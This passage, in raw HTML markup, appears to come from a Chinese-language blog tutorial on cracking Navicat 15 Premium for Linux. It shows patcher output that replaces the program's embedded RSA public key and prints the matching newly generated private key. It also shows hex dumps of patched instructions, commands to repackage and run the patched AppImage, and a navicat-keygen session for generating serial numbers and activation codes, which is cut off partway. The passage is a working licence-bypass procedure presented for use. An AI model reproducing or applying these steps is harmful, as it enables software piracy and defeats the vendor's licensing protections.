class="hljs-string">CF39AoGBAIni+wquohFgYTrCs8jhvHwK+llYqnDVjFCm4EetHPQpnAfr17/WSpI+</span></span><br><span class="language-yaml">    <span class="hljs-string">dJQHXd1mnLPSE0GxMa7uZSkQ82Ph/HBCJY+Ht/7czo31Jws0nUUtOOCjTuoYHV5b</span></span><br><span class="language-yaml">    <span class="hljs-string">bYNak7aYKLsn1vDYSr9BqZp56p8ZLD9ObWXCJ6KifFd6n6iWKnz+</span></span><br><span class="language-yaml">    <span class="hljs-string">-----END</span> <span class="hljs-string">RSA</span> <span class="hljs-string">PRIVATE</span> <span class="hljs-string">KEY-----</span></span><br><span class="language-yaml">[<span class="hljs-string">*</span>] <span class="hljs-attr">Your RSA public key:</span></span><br><span class="language-yaml">    <span class="hljs-string">-----BEGIN</span> <span class="hljs-string">PUBLIC</span> <span class="hljs-string">KEY-----</span></span><br><span class="language-yaml">    <span class="hljs-string">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwGklHmDx9hacVUjT94Yd</span></span><br><span class="language-yaml">    <span class="hljs-string">py/1mTHJ7lJy6aGu84MjQDHBw4NiiNG+axcv0gi5RATceD0DTZdF/Mt2dklWwMfG</span></span><br><span class="language-yaml">    <span class="hljs-string">i3Ztk3Axbnof/byDCEeriQ79bCEb1rPqiVmXH54wwS/6kM8d+rQW/xx6WWndo8Jv</span></span><br><span class="language-yaml">    <span class="hljs-string">asPYApRjW9moxnOT4ylzvjw/AMzANw0dPfNqRtdYcOflIvP3PvwFhaYqb9mk7Lhn</span></span><br><span class="language-yaml">    <span class="hljs-string">fBqUF4fKwnPwtnC+g2L8V2gPlHQbNIOuxP7krX6lreEn1vK6E03doV1ZGs74ZYwc</span></span><br><span class="language-yaml">    <span class="hljs-string">QGcb7RFPt/gVATzN/E8CILBq8pBtO19Cpv44cvXY2fBDL9q5UauS4dqvI9EjAjFR</span></span><br><span class="language-yaml">    <span class="hljs-string">vwIDAQAB</span></span><br><span class="language-yaml">    <span class="hljs-string">-----END</span> <span class="hljs-string">PUBLIC</span> <span class="hljs-string">KEY-----</span></span><br><span class="language-yaml"></span><br><span class="language-yaml"><span class="hljs-string">*******************************************************</span></span><br><span class="language-yaml"><span class="hljs-string">*</span>                   <span class="hljs-string">PatchSolution0</span>                    <span class="hljs-string">*</span></span><br><span class="language-yaml"><span class="hljs-string">*******************************************************</span></span><br><span class="language-yaml">[<span class="hljs-string">*</span>] <span class="hljs-attr">Previous:</span></span><br><span class="language-yaml"><span class="hljs-string">+0x0000000000000070</span>                          <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">05</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span>          <span class="hljs-string">........</span></span><br>+0x0000000000000080 <span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00  ................<br>+0x0000000000000090 <span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 48 </span>56 a2<span class="hljs-number"> 02 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span> ........HV......<br>+0x00000000000000a0 <span class="hljs-number"> 48 </span>56 a2<span class="hljs-number"> 02 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 10 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span> HV..............<br>[*] After:<br>+0x0000000000000070                         <span class="hljs-number"> 01 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 05 </span>00<span class="hljs-number"> 00 </span>00          ........<br>+0x0000000000000080 <span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00  ................<br>+0x0000000000000090 <span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00 d8<span class="hljs-number"> 57 </span>a2<span class="hljs-number"> 02 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span> .........W......<br>+0x00000000000000a0  d8<span class="hljs-number"> 57 </span>a2<span class="hljs-number"> 02 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 10 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span> .W..............<br><br>[*] Previous:<br>+0x0000000002a25640                         <span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00          ........<br>+0x0000000002a25650 <span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00  ................<br>+0x0000000002a25660 <span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00  ................<br>+0x0000000002a25670 <span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00  ................<br>+0x0000000002a25680 <span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00  ................<br>+0x0000000002a25690 <span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00  ................<br>+0x0000000002a256a0 <span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00  ................<br>+0x0000000002a256b0 <span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00  ................<br>+0x0000000002a256c0 <span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00  ................<br>+0x0000000002a256d0 <span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00  ................<br>+0x0000000002a256e0 <span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00  ................<br>+0x0000000002a256f0 <span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00  ................<br>+0x0000000002a25700 <span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00  ................<br>+0x0000000002a25710 <span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00  ................<br>+0x0000000002a25720 <span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00  ................<br>+0x0000000002a25730 <span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00  ................<br>+0x0000000002a25740 <span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00  ................<br>+0x0000000002a25750 <span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00  ................<br>+0x0000000002a25760 <span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00  ................<br>+0x0000000002a25770 <span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00  ................<br>+0x0000000002a25780 <span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00  ................<br>+0x0000000002a25790 <span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00  ................<br>+0x0000000002a257a0 <span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00  ................<br>+0x0000000002a257b0 <span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00  ................<br>+0x0000000002a257c0 <span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00  ................<br>+0x0000000002a257d0 <span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>00                          ........        <br>[*] After:<br>+0x0000000002a25640                          ef be ad de 4d<span class="hljs-number"> 49 </span>49<span class="hljs-number"> 42 </span>         ....MIIB<br>+0x0000000002a25650 <span class="hljs-number"> 49 </span>6a<span class="hljs-number"> 41 </span>4e<span class="hljs-number"> 42 </span>67 6b<span class="hljs-number"> 71 </span>68 6b<span class="hljs-number"> 69 </span>47<span class="hljs-number"> 39 </span>77<span class="hljs-number"> 30 </span>42  IjANBgkqhkiG9w0B<br>+0x0000000002a25660 <span class="hljs-number"> 41 </span>51<span class="hljs-number"> 45 </span>46<span class="hljs-number"> 41 </span>41 4f<span class="hljs-number"> 43 </span>41<span class="hljs-number"> 51 </span>38<span class="hljs-number"> 41 </span>4d<span class="hljs-number"> 49 </span>49<span class="hljs-number"> 42 </span> AQEFAAOCAQ8AMIIB<br>+0x0000000002a25670 <span class="hljs-number"> 43 </span>67 4b<span class="hljs-number"> 43 </span>41<span class="hljs-number"> 51 </span>45<span class="hljs-number"> 41 </span>77<span class="hljs-number"> 47 </span>6b 6c<span class="hljs-number"> 48 </span>6d<span class="hljs-number"> 44 </span>78  CgKCAQEAwGklHmDx<br>+0x0000000002a25680 <span class="hljs-number"> 39 </span>68<span class="hljs-number"> 61 </span>63<span class="hljs-number"> 56 </span>55 6a<span class="hljs-number"> 54 </span>39<span class="hljs-number"> 34 </span>59<span class="hljs-number"> 64 </span>70<span class="hljs-number"> 79 </span>2f<span class="hljs-number"> 31 </span> 9hacVUjT94Ydpy/1<br>+0x0000000002a25690  6d<span class="hljs-number"> 54 </span>48 4a<span class="hljs-number"> 37 </span>6c 4a<span class="hljs-number"> 79 </span>36<span class="hljs-number"> 61 </span>47<span class="hljs-number"> 75 </span>38<span class="hljs-number"> 34 </span>4d 6a  mTHJ7lJy6aGu84Mj<br>+0x0000000002a256a0 <span class="hljs-number"> 51 </span>44<span class="hljs-number"> 48 </span>42<span class="hljs-number"> 77 </span>34 4e<span class="hljs-number"> 69 </span>69 4e<span class="hljs-number"> 47 </span>2b<span class="hljs-number"> 61 </span>78<span class="hljs-number"> 63 </span>76  QDHBw4NiiNG+axcv<br>+0x0000000002a256b0 <span class="hljs-number"> 30 </span>67<span class="hljs-number"> 69 </span>35<span class="hljs-number"> 52 </span>41<span class="hljs-number"> 54 </span>63<span class="hljs-number"> 65 </span>44<span class="hljs-number"> 30 </span>44<span class="hljs-number"> 54 </span>5a<span class="hljs-number"> 64 </span>46  0gi5RATceD0DTZdF<br>+0x0000000002a256c0  2f 4d<span class="hljs-number"> 74 </span>32<span class="hljs-number"> 64 </span>6b 6c<span class="hljs-number"> 57 </span>77 4d<span class="hljs-number"> 66 </span>47<span class="hljs-number"> 69 </span>33 5a<span class="hljs-number"> 74 </span> /Mt2dklWwMfGi3Zt<br>+0x0000000002a256d0  6b<span class="hljs-number"> 33 </span>41<span class="hljs-number"> 78 </span>62 6e 6f<span class="hljs-number"> 66 </span>2f<span class="hljs-number"> 62 </span>79<span class="hljs-number"> 44 </span>43<span class="hljs-number"> 45 </span>65<span class="hljs-number"> 72 </span> k3Axbnof/byDCEer<br>+0x0000000002a256e0 <span class="hljs-number"> 69 </span>51<span class="hljs-number"> 37 </span>39<span class="hljs-number"> 62 </span>43<span class="hljs-number"> 45 </span>62<span class="hljs-number"> 31 </span>72<span class="hljs-number"> 50 </span>71<span class="hljs-number"> 69 </span>56 6d<span class="hljs-number"> 58 </span> iQ79bCEb1rPqiVmX<br>+0x0000000002a256f0 <span class="hljs-number"> 48 </span>35<span class="hljs-number"> 34 </span>77<span class="hljs-number"> 77 </span>53 2f<span class="hljs-number"> 36 </span>6b 4d<span class="hljs-number"> 38 </span>64 2b<span class="hljs-number"> 72 </span>51<span class="hljs-number"> 57 </span> H54wwS/6kM8d+rQW<br>+0x0000000002a25700  2f<span class="hljs-number"> 78 </span>78<span class="hljs-number"> 36 </span>57<span class="hljs-number"> 57 </span>6e<span class="hljs-number"> 64 </span>6f<span class="hljs-number"> 38 </span>4a<span class="hljs-number"> 76 </span>61<span class="hljs-number"> 73 </span>50<span class="hljs-number"> 59 </span> /xx6WWndo8JvasPY<br>+0x0000000002a25710 <span class="hljs-number"> 41 </span>70<span class="hljs-number"> 52 </span>6a<span class="hljs-number"> 57 </span>39 6d 6f<span class="hljs-number"> 78 </span>6e 4f<span class="hljs-number"> 54 </span>34<span class="hljs-number"> 79 </span>6c 7a  ApRjW9moxnOT4ylz<br>+0x0000000002a25720 <span class="hljs-number"> 76 </span>6a<span class="hljs-number"> 77 </span>2f<span class="hljs-number"> 41 </span>4d 7a<span class="hljs-number"> 41 </span>4e<span class="hljs-number"> 77 </span>30<span class="hljs-number"> 64 </span>50<span class="hljs-number"> 66 </span>4e<span class="hljs-number"> 71 </span> vjw/AMzANw0dPfNq<br>+0x0000000002a25730 <span class="hljs-number"> 52 </span>74<span class="hljs-number"> 64 </span>59<span class="hljs-number"> 63 </span>4f<span class="hljs-number"> 66 </span>6c<span class="hljs-number"> 49 </span>76<span class="hljs-number"> 50 </span>33<span class="hljs-number"> 50 </span>76<span class="hljs-number"> 77 </span>46  RtdYcOflIvP3PvwF<br>+0x0000000002a25740 <span class="hljs-number"> 68 </span>61<span class="hljs-number"> 59 </span>71<span class="hljs-number"> 62 </span>39 6d 6b<span class="hljs-number"> 37 </span>4c<span class="hljs-number"> 68 </span>6e<span class="hljs-number"> 66 </span>42<span class="hljs-number"> 71 </span>55  haYqb9mk7LhnfBqU<br>+0x0000000002a25750 <span class="hljs-number"> 46 </span>34<span class="hljs-number"> 66 </span>4b<span class="hljs-number"> 77 </span>6e<span class="hljs-number"> 50 </span>77<span class="hljs-number"> 74 </span>6e<span class="hljs-number"> 43 </span>2b<span class="hljs-number"> 67 </span>32 4c<span class="hljs-number"> 38 </span> F4fKwnPwtnC+g2L8<br>+0x0000000002a25760 <span class="hljs-number"> 56 </span>32<span class="hljs-number"> 67 </span>50 6c<span class="hljs-number"> 48 </span>51<span class="hljs-number"> 62 </span>4e<span class="hljs-number"> 49 </span>4f<span class="hljs-number"> 75 </span>78<span class="hljs-number"> 50 </span>37 6b  V2gPlHQbNIOuxP7k<br>+0x0000000002a25770 <span class="hljs-number"> 72 </span>58<span class="hljs-number"> 36 </span>6c<span class="hljs-number"> 72 </span>65<span class="hljs-number"> 45 </span>6e<span class="hljs-number"> 31 </span>76 4b<span class="hljs-number"> 36 </span>45<span class="hljs-number"> 30 </span>33<span class="hljs-number"> 64 </span> rX6lreEn1vK6E03d<br>+0x0000000002a25780  6f<span class="hljs-number"> 56 </span>31 5a<span class="hljs-number"> 47 </span>73<span class="hljs-number"> 37 </span>34 5a<span class="hljs-number"> 59 </span>77<span class="hljs-number"> 63 </span>51<span class="hljs-number"> 47 </span>63<span class="hljs-number"> 62 </span> oV1ZGs74ZYwcQGcb<br>+0x0000000002a25790 <span class="hljs-number"> 37 </span>52<span class="hljs-number"> 46 </span>50<span class="hljs-number"> 74 </span>2f<span class="hljs-number"> 67 </span>56<span class="hljs-number"> 41 </span>54 7a 4e 2f<span class="hljs-number"> 45 </span>38<span class="hljs-number"> 43 </span> 7RFPt/gVATzN/E8C<br>+0x0000000002a257a0 <span class="hljs-number"> 49 </span>4c<span class="hljs-number"> 42 </span>71<span class="hljs-number"> 38 </span>70<span class="hljs-number"> 42 </span>74 4f<span class="hljs-number"> 31 </span>39<span class="hljs-number"> 43 </span>70<span class="hljs-number"> 76 </span>34<span class="hljs-number"> 34 </span> ILBq8pBtO19Cpv44<br>+0x0000000002a257b0 <span class="hljs-number"> 63 </span>76<span class="hljs-number"> 58 </span>59<span class="hljs-number"> 32 </span>66<span class="hljs-number"> 42 </span>44 4c<span class="hljs-number"> 39 </span>71<span class="hljs-number"> 35 </span>55<span class="hljs-number"> 61 </span>75<span class="hljs-number"> 53 </span> cvXY2fBDL9q5UauS<br>+0x0000000002a257c0 <span class="hljs-number"> 34 </span>64<span class="hljs-number"> 71 </span>76<span class="hljs-number"> 49 </span>39<span class="hljs-number"> 45 </span>6a<span class="hljs-number"> 41 </span>6a<span class="hljs-number"> 46 </span>52<span class="hljs-number"> 76 </span>77<span class="hljs-number"> 49 </span>44  4dqvI9EjAjFRvwID<br>+0x0000000002a257d0 <span class="hljs-number"> 41 </span>51<span class="hljs-number"> 41 </span>42 ad de ef be                          AQAB....        <br><br>[*] Previous:<br>+0x000000000141fbf0 <span class="hljs-number"> 44 </span>0f b6<span class="hljs-number"> 24 </span>18<span class="hljs-number"> 48 </span>8b<span class="hljs-number"> 44 </span>24<span class="hljs-number"> 28 </span>8b<span class="hljs-number"> 50 </span>f8<span class="hljs-number"> 85 </span>d2<span class="hljs-number"> 79 </span> D..$.H.D$(.P...y<br>+0x000000000141fc00  6f                                               o               <br>[*] After:<br>+0x000000000141fbf0 <span class="hljs-number"> 45 </span>31 e4<span class="hljs-number"> 48 </span>8d<span class="hljs-number"> 05 </span>52 5a<span class="hljs-number"> 60 </span>01<span class="hljs-number"> 90 </span>90<span class="hljs-number"> 90 </span>90<span class="hljs-number"> 90 </span>90  E1.H..RZ`.......<br>+0x000000000141fc00 <span class="hljs-number"> 90 </span>                                              .               <br><br>[*] New RSA-2048 private key has been saved to<br>    /home/hksanduo/Downloads/navicat-keygen/RegPrivateKey.pem<br><br>*******************************************************<br>*           PATCH HAS BEEN DONE SUCCESSFULLY!         *<br>*                  HAVE FUN AND ENJOY~                *<br>*******************************************************<br><br></code></pre></td></tr></table></figure><h3 id="将文件重新打包成AppImage"><a href="#将文件重新打包成AppImage" class="headerlink" title="将文件重新打包成AppImage"></a>将文件重新打包成AppImage</h3><p>具体指令可以参考以下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">wget <span class="hljs-string">&#x27;https://github.com/AppImage/AppImageKit/releases/download/continuous/appimagetool-x86_64.AppImage&#x27;</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">chmod</span> +x appimagetool-x86_64.AppImage</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">./appimagetool-x86_64.AppImage ~/Desktop/navicat15-premium-en-patched ~/Desktop/navicat15-premium-en-patched.AppImage</span><br></code></pre></td></tr></table></figure><h3 id="运行刚生成的AppImage："><a href="#运行刚生成的AppImage：" class="headerlink" title="运行刚生成的AppImage："></a>运行刚生成的AppImage：</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">chmod</span> +x ~/Desktop/navicat15-premium-en-patched.AppImage</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">~/Desktop/navicat15-premium-en-patched.AppImage</span><br></code></pre></td></tr></table></figure><h3 id="使用-navicat-keygen-来生成-序列号-和-激活码。"><a href="#使用-navicat-keygen-来生成-序列号-和-激活码。" class="headerlink" title="使用 navicat-keygen 来生成 序列号 和 激活码。"></a>使用 navicat-keygen 来生成 序列号 和 激活码。</h3><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">Usage:</span><br>    navicat-keygen &lt;--bin|--<span class="hljs-keyword">text</span>&gt; [--adv] &lt;RSA-<span class="hljs-number">2048</span> <span class="hljs-keyword">Private</span> <span class="hljs-keyword">Key</span> File&gt;<br><br>        &lt;--bin|--<span class="hljs-keyword">text</span>&gt;    Specify <span class="hljs-string">&quot;--bin&quot;</span> <span class="hljs-keyword">to</span> generate <span class="hljs-string">&quot;license_file&quot;</span> used <span class="hljs-keyword">by</span> Navicat <span class="hljs-number">11</span>.<br>                          Specify <span class="hljs-string">&quot;--text&quot;</span> <span class="hljs-keyword">to</span> generate base64-encoded activation code.<br>                          This parameter must be specified.<br><br>        [--adv]                       Enable advance mode.<br>                                      This parameter <span class="hljs-built_in">is</span> <span class="hljs-keyword">optional</span>.<br><br>        &lt;RSA-<span class="hljs-number">2048</span> <span class="hljs-keyword">Private</span> <span class="hljs-keyword">Key</span> File&gt;   A path <span class="hljs-keyword">to</span> an RSA-<span class="hljs-number">2048</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">key</span> file.<br>                                      This parameter must be specified.<br></code></pre></td></tr></table></figure><p>例如：</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">$ <span class="hljs-string">./bin/navicat-keygen</span> <span class="hljs-params">--text</span> <span class="hljs-string">./RegPrivateKey.pem</span><br></code></pre></td></tr></table></figure><p>你会被要求选择Navicat产品类别、Navicat语言版本和填写主版本号。之后一个随机生成的 序列号 将会给出。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs markdown">$ ./bin/navicat-keygen --text ./RegPrivateKey.pem<br><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span>**<br><span class="hljs-bullet">*</span>       Navicat Keygen (Linux) by @DoubleLabyrinth       *<br><span class="hljs-bullet">*</span>                   Version: 1.0                         *<br><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span>**<br><br>[<span class="hljs-emphasis">*] Select Navicat product:</span><br><span class="hljs-emphasis">0. DataModeler</span><br><span class="hljs-emphasis">1. Premium</span><br><span class="hljs-emphasis">2. MySQL</span><br><span class="hljs-emphasis">3. PostgreSQL</span><br><span class="hljs-emphasis">4. Oracle</span><br><span class="hljs-emphasis">5. SQLServer</span><br><span class="hljs-emphasis">6. SQLite</span><br><span class="hljs-emphasis">7. MariaDB</span><br><span class="hljs-emphasis">8. MongoDB</span><br><span class="hljs-emphasis">9. ReportViewer</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">(Input index)&gt; 1</span><br><span class="hljs-emphasis"></span><br><span class="hljs-emphasis">[*</span>] Select product language:<br><span class="hljs-bullet">0.</span> English<br><span class="hljs-bullet">1.</span> Simplified Chinese<br><span class="hljs-bullet">2.</span> Traditional Chinese<br><span class="hljs-bullet">3.</span> Japanese<br><span class="hljs-bullet">4.</span> Polish<br><span 